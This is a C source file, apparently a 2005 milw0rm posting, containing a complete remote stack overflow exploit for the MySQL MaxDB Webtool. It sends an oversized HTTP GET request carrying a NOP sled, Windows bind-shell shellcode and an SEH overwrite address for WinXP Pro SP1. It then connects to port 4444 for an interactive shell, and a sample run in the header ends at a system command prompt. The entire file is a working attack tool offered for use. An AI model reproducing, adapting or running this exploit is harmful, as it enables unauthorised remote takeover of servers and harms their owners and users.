/*
 * MySQL MaxDB Webtool Remote Stack Overflow Exploit
 *
 * cybertronic[at]gmx[dot]net
 *
 * 04/27/2005
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ select target
 * --[ 0 [0x100163d2] esi ebp ret
 * --[ 1 [0xdeadc0de] crash server
 *  >> 0
 * --[ connecting to 192.168.2.103:9999...done!
 * --[ sending packet [ 16383 bytes ]...done!
 * --[ sleeping 5 seconds before connecting to 192.168.2.103:4444...
 * --[ connecting to 192.168.2.103:4444...done!
 * --[ b0x pwned - h4ve phun
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\WINDOWS\system32>
 * 
 */


#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT	9999

#define RED		"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

/*
 *
 * prototypes
 *
 */

int exploit ( int s, unsigned long ret );
int isip ( char *ip );
int shell ( int s, char* tip, unsigned short cbport );

void connect_to_bindshell ( char* tip, unsigned short bport );
void header ();
void wait ( int sec );

/*********************
 * Windows Shellcode *
 *********************/
 
/* win32_bind */
unsigned char bindshell[] =
"\x31\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x92"
"\x35\x88\x95\x83\xeb\xfc\xe2\xf4\x6e\x5f\x63\xda\x7a\xcc\x77\x6a"
"\x6d\x55\x03\xf9\xb6\x11\x03\xd0\xae\xbe\xf4\x90\xea\x34\x67\x1e"
"\xdd\x2d\x03\xca\xb2\x34\x63\x76\xa2\x7c\x03\xa1\x19\x34\x66\xa4"
"\x52\xac\x24\x11\x52\x41\x8f\x54\x58\x38\x89\x57\x79\xc1\xb3\xc1"
"\xb6\x1d\xfd\x76\x19\x6a\xac\x94\x79\x53\x03\x99\xd9\xbe\xd7\x89"
"\x93\xde\x8b\xb9\x19\xbc\xe4\xb1\x8e\x54\x4b\xa4\x52\x51\x03\xd5"
"\xa2\xbe\xc8\x99\x19\x45\x94\x38\x19\x75\x80\xcb\xfa\xbb\xc6\x9b"
"\x7e\x65\x77\x43\xa3\xee\xee\xc6\xf4\x5d\xbb\xa7\xfa\x42\xfb\xa7"
"\xcd\x61\x77\x45\xfa\xfe\x65\x69\xa9\x65\x77\x43\xcd\xbc\x6d\xf3"
"\x13\xd8\x80\x97\xc7\x5f\x8a\x6a\x42\x5d\x51\x9c\x67\x98\xdf\x6a"
"\x44\x66\xdb\xc6\xc1\x66\xcb\xc6\xd1\x66\x77\x45\xf4\x5d\x99\xc9"
"\xf4\x66\x01\x74\x07\x5d\x2c\x8f\xe2\xf2\xdf\x6a\x44\x5f\x98\xc4"
"\xc7\xca\x58\xfd\x36\x98\xa6\x7c\xc5\xca\x5e\xc6\xc7\xca\x58\xfd"
"\x77\x7c\x0e\xdc\xc5\xca\x5e\xc5\xc6\x61\xdd\x6a\x42\xa6\xe0\x72"
"\xeb\xf3\xf1\xc2\x6d\xe3\xdd\x6a\x42\x53\xe2\xf1\xf4\x5d\xeb\xf8"
"\x1b\xd0\xe2\xc5\xcb\x1c\x44\x1c\x75\x5f\xcc\x1c\x70\x04\x48\x66"
"\x38\xcb\xca\xb8\x6c\x77\xa4\x06\x1f\x4f\xb0\x3e\x39\x9e\xe0\xe7"
"\x6c\x86\x9e\x6a\xe7\x71\x77\x43\xc9\x62\xda\xc4\xc3\x64\xe2\x94"
"\xc3\x64\xdd\xc4\x6d\xe5\xe0\x38\x4b\x30\x46\xc6\x6d\xe3\xe2\x6a"
"\x6d\x02\x77\x45\x19\x62\x74\x16\x56\x51\x77\x43\xc0\xca\x58\xfd"
"\x62\xbf\x8c\xca\xc1\xca\x5e\x6a\x42\x35\x88\x95";

unsigned char jmp1[] =
"\xeb\x08";

unsigned char jmp2[] =
"\xe9\xe2\xf7\xff\xff"; //jmp -2078

/*
 *
 * structures
 *
 */

struct targets {
	int  num;
	unsigned long ret;
	char name[64];  
}

target[]= {
	{ 0, 0x100163d2, "WinXP Pro SP1 GER" }, //tested working on my WinXP Pro SP1 box [ pop pop ret in wapi.dll ]
	{ 1, 0xdeadc0de, "crash server" },
};

/*
 *
 * functions
 *
 */

int
exploit ( int s, unsigned long ret )
{
	char buffer[16384];

	bzero ( &buffer, sizeof ( buffer ) );
	memset ( buffer, 0x90, sizeof ( buffer ) -13 );
	strncpy ( buffer, "GET /%", 6 );
	memcpy ( buffer + 1600, bindshell, sizeof ( bindshell ) - 1 );
	memcpy ( buffer + 3657, jmp1, sizeof ( jmp1 ) -1 );
/*
 *
 * SEH offset changes for different binary path
 * This exploits WinXP Pro SP1 GER asuming the
 * default path of C:\Programme\sdb\programs\web\Documents
 * englisch version is supported by metasploit
 * http://www.metasploit.com/projects/Framework/modules/exploits/maxdb_webdbm_get_overflow.pm
 *
 */
	strncpy ( buffer + 3661, ( unsigned char* ) &ret, 4 );
	memcpy ( buffer + 3673, jmp2, sizeof ( jmp2 ) -1 );
	strncat ( buffer, "HTTP/1.0\r\n\r\n", 12 );

	printf ( "--[ sending packet [ %u bytes ]...", strlen ( buffer ) );
	if ( write ( s, buffer, strlen ( buffer ) ) <= 0 )
	{
		printf ( RED "failed!\n" NORMAL);
		return ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);

	return ( 0 );
}

int
isip ( char *ip )
{
	int a, b, c, d;
	
	if ( !sscanf ( ip, "%d.%d.%d.%d", &a, &b, &c, &d ) )
		return ( 0 );
	if ( a < 1 )
		return ( 0 );
	if ( a > 255 )
		return 0;
	if ( b < 0 )
		return 0;
	if ( b > 255 )
		return 0;
	if ( c < 0 )
		return 0;
	if ( c > 255 )
		return 0;
	if ( d < 0 )
		return 0;
	if ( d > 255 )
		return 0;
	return 1;
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ("--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
	wait ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip, bport );
}

void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{
	int s, targ, i;
	struct sockaddr_in remote_addr;
	struct hostent* host_addr;

	if ( argc != 2 )
	{
		printf ( "Usage: %s <ip>\n", argv[0] );
		exit ( 1 );
	}
	system ( "clear" );
	header ();
	if ( !isip ( argv[1] ) )
	{
		printf ( "Invalid Target IP!\n" );
		exit ( 1 );
	}
	printf("--[ select target\n");
	for ( i = 0; i < 2; i++ )
		printf ( "--[ %d [0x%08x] %s\n", target[i].num, target[i].ret, target[i].name );
	printf ( " >> " );
	scanf ( "%d", &targ );
	if ( targ != 0 )
		if ( targ != 1 )
		{
			printf ( "--[ invalid target!\n" );
			exit ( 1 );
		}
	if ( ( host_addr = gethostbyname ( argv[1] ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", argv[1] );
		exit ( 1 );
	}
	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( PORT );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
    {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ connecting to %s:%u...", argv[1], PORT  );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( "failed!\n" );
		exit ( 1 );
	}
	printf ( "done!\n" );
	if ( exploit ( s, target[targ].ret ) == 1 )
	{
		printf ( "exploitation FAILED!\n" );
		exit ( 1 );
	}
	close ( s );
	connect_to_bindshell ( argv[1], 4444 );
}

// milw0rm.com [2005-04-27]